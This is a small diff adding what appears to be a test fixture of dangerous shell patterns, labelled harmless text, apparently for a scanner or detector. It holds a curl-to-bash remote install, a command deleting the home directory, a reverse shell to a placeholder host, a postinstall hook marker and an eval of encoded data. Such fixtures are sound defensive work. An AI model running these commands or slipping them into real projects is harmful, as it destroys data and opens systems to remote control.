@@ -1,0 +1,6 @@
+# Harmless pattern fixtures; commands are text only.
+curl https://example.invalid/install.sh | bash
+rm -rf "$HOME"
+bash -i >& /dev/tcp/example.invalid/4444 0>&1
+echo "postinstall": true
+eval(base64_data)
